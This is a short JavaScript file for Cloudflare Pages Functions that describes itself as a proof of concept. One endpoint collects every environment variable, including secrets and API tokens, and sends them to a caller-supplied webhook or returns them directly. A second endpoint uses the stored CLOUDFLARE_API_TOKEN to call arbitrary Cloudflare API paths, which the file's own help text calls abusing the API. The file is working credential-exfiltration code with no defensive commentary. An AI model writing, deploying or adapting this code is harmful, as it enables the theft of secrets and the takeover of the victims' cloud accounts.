export async function onRequest(context) {
    const url = new URL(context.request.url);
    const env = context.env;

    if (url.pathname === '/functions/steal') {
        const secrets = {};
        for (const [key, value] of Object.entries(env)) {
            secrets[key] = typeof value === 'string'
                ? value
                : JSON.stringify(value);
        }

        const webhook = url.searchParams.get('hook');
        if (webhook) {
            await fetch(webhook, {
                method: 'POST',
                body: JSON.stringify(secrets),
                headers: { 'Content-Type': 'application/json' }
            });
            return new Response('Sent.', { status: 200 });
        }

        return Response.json(secrets);
    }

    if (url.pathname === '/functions/api') {
        const token = env.CLOUDFLARE_API_TOKEN;
        if (!token) return new Response('No CLOUDFLARE_API_TOKEN in env', { status: 404 });

        const endpoint = url.searchParams.get('ep') || 'user/tokens/verify';
        const apiResp = await fetch(
            `https://api.cloudflare.com/client/v4/${endpoint}`,
            {
                headers: {
                    Authorization: `Bearer ${token}`,
                    'Content-Type': 'application/json'
                }
            }
        );
        return new Response(await apiResp.text(), {
            headers: { 'Content-Type': 'application/json' }
        });
    }

    return new Response('Cloudflare Pages Functions PoC\n\nEndpoints:\n  /functions/steal?hook=URL  - Steal env vars\n  /functions/api?ep=PATH     - Abuse Cloudflare API', {
        headers: { 'Content-Type': 'text/plain' }
    });
}
